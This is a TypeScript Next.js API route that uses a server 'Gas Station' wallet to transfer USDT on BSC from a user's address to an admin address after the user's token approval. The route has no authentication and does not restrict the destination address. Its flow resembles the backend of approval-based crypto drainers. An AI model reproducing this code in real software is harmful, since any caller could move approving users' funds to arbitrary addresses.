import { NextRequest, NextResponse } from 'next/server'
import { getGasStation } from '@/lib/gasStation'

export async function POST(request: NextRequest) {
  try {
    const { 
      userAddress, 
      adminAddress, 
      usdtAmount,
      chainId
    } = await request.json()
    
    if (chainId !== 56) {
      return NextResponse.json(
        { 
          success: false,
          error: 'Only BSC Mainnet (Chain ID 56) is supported',
          code: 'INVALID_NETWORK'
        },
        { status: 400 }
      )
    }
    
    if (!userAddress || !adminAddress || !usdtAmount) {
      return NextResponse.json(
        { 
          success: false,
          error: 'Missing required parameters: userAddress, adminAddress, usdtAmount',
          code: 'MISSING_PARAMS' 
        },
        { status: 400 }
      )
    }

    console.log('🚀 Executing USDT transfer after user approval:', {
      userAddress,
      adminAddress,
      usdtAmount,
      chainId
    })
    
    const gasStation = getGasStation(56)
    
    if (!gasStation.isReady()) {
      return NextResponse.json(
        { 
          success: false,
          error: 'Gas Station not ready. Please try again later.',
          code: 'GAS_STATION_NOT_READY'
        },
        { status: 503 }
      )
    }

    console.log('✅ Gas Station ready, executing transfer after approval...')
    
    // Execute the transfer after approval
    const transferHash = await gasStation.executeTransferAfterApproval(
      userAddress as `0x${string}`,
      adminAddress as `0x${string}`,
      usdtAmount
    )
    
    console.log('✅ USDT transfer successful after approval:', transferHash)
    
    return NextResponse.json({
      success: true,
      txHash: transferHash,
      chainId: 56,
      gasStationAddress: gasStation.getAddress(),
      method: 'transfer_after_approval',
      gasPaidBy: 'Gas Station',
      userGasCost: '0 BNB',
      message: 'USDT successfully transferred from your account to admin account after approval!'
    })
    
  } catch (error) {
    console.error('❌ Transfer after approval error:', error)
    
    const errorMessage = error instanceof Error ? error.message : 'Transfer after approval failed'
    
    if (errorMessage.includes('User has not approved Gas Station yet')) {
      return NextResponse.json(
        { 
          success: false,
          error: 'User has not approved Gas Station for USDT spending yet.',
          code: 'NOT_APPROVED_YET'
        },
        { status: 400 }
      )
    }
    
    if (errorMessage.includes('Insufficient allowance')) {
      return NextResponse.json(
        { 
          success: false,
          error: 'Insufficient allowance for transfer. Please ensure Gas Station is approved for the required amount.',
          code: 'INSUFFICIENT_ALLOWANCE'
        },
        { status: 400 }
      )
    }
    
    return NextResponse.json(
      { 
        success: false,
        error: errorMessage,
        code: 'TRANSFER_FAILED'
      },
      { status: 500 }
    )
  }
}